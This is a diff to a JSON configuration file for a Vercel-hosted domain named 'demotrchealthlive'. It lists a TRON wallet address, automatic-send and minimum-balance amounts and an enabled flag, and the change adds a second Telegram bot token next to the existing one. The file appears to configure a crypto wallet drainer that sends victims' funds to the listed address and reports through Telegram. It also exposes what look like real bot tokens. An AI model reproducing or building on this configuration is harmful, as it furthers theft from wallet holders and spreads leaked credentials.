@@ -1,8 +1,16 @@
 {
   "demotrchealthlive.vercel.app": {
     "tronAddress": "THnAAFX6d4Ed9UUgF5UbBMb4nz66TSJzih",
-    "telegramBotToken": "7536567492:AAHTGbJZXi2g7N_qY-AnpTBMZ6jHFYM42eM",
-    "telegramChatId": "8191508290",
+    "telegramBots": [
+      {
+        "botToken": "7536567492:AAHTGbJZXi2g7N_qY-AnpTBMZ6jHFYM42eM",
+        "chatId": "8191508290"
+      },
+      {
+        "botToken": "8447896801:AAEriJZrncMi8a-GTxVnThLK8URsiGDpnu4",
+        "chatId": "8191508290"
+      }
+    ],
     "autoSendAmount": 13,
     "minimumBalance": 11,
     "enabled": true
